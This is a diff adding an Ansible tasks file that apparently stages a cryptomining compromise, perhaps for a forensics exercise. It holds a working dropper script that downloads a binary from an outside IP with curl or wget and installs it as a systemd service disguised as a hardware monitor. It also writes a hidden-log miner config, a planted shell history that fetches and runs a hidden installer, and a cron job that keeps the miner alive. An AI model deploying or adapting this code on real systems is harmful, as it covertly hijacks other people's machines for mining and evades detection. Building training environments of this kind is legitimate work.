@@ -1,0 +1,118 @@
+---
+- name: Create miner config directory
+  file:
+    path: "{{ miner_config_dir }}"
+    state: directory
+    owner: "{{ username }}"
+    group: "{{ username }}"
+    mode: "0700"
+
+- name: Create XMRig-style miner config
+  copy:
+    dest: "{{ miner_config_file }}"
+    owner: "{{ username }}"
+    group: "{{ username }}"
+    mode: "0600"
+    content: |
+      {
+          "autosave": true,
+          "background": true,
+          "cpu": {
+              "enabled": true,
+              "max-threads-hint": 100,
+              "priority": 2
+          },
+          "pools": [
+              {
+                  "url": "{{ pool_host }}:{{ pool_port }}",
+                  "user": "{{ wallet }}",
+                  "pass": "x",
+                  "keepalive": true,
+                  "tls": false
+              }
+          ],
+          "print-time": 60,
+          "algo": "rx/0",
+          "log-file": "/var/log/.sys-mon"
+      }
+
+- name: Create dropper artifact script
+  copy:
+    dest: "{{ dropper_path }}"
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/bash
+      # System maintenance tool v2.1.4
+
+      BINARY_URL="http://185.183.98.46/sys-monitor"
+      INSTALL_PATH="{{ miner_binary }}"
+      CONFIG_DIR="{{ miner_config_dir }}"
+      SERVICE_NAME="sys-monitor"
+
+      echo "[*] Checking for existing installation..."
+      if [ -f "$INSTALL_PATH" ]; then
+          echo "[*] Already installed. Updating configuration..."
+          exit 0
+      fi
+
+      curl -sL "$BINARY_URL" -o "$INSTALL_PATH" 2>/dev/null || \
+          wget -q "$BINARY_URL" -O "$INSTALL_PATH" 2>/dev/null
+
+      chmod 755 "$INSTALL_PATH"
+
+      mkdir -p "$CONFIG_DIR"
+      cat > "$CONFIG_DIR/config.json" << 'CONF'
+      {"algo":"rx/0","pools":[{"url":"{{ pool_host }}:{{ pool_port }}","user":"{{ wallet }}","pass":"x"}]}
+      CONF
+
+      cat > /etc/systemd/system/${SERVICE_NAME}.service << 'EOF'
+      [Unit]
+      Description=System Hardware Monitor
+      After=network-online.target
+
+      [Service]
+      Type=simple
+      ExecStart=/usr/local/sbin/sys-monitor
+      Restart=always
+      RestartSec=5
+
+      [Install]
+      WantedBy=multi-user.target
+      EOF
+
+      systemctl daemon-reload
+      systemctl enable "$SERVICE_NAME"
+      systemctl start "$SERVICE_NAME"
+
+      echo "[+] Installation complete."
+
+- name: Plant fake bash_history with attacker commands
+  copy:
+    dest: "/home/{{ username }}/.bash_history"
+    owner: "{{ username }}"
+    group: "{{ username }}"
+    mode: "0600"
+    content: |
+      ls /tmp
+      cd /tmp
+      wget http://185.183.98.46/.installer -O .installer
+      chmod +x .installer
+      ./.installer
+      ps aux | grep sys-monitor
+      systemctl status sys-monitor
+      top
+      ls -la /usr/local/sbin/
+      cat /var/log/.sys-mon
+      exit
+
+- name: Create cron watchdog for miner persistence
+  copy:
+    dest: "{{ cron_job_file }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      # System update watchdog
+      * * * * * root /bin/bash -c 'pgrep -f sys-monitor > /dev/null || systemctl start sys-monitor.service' 2>/dev/null
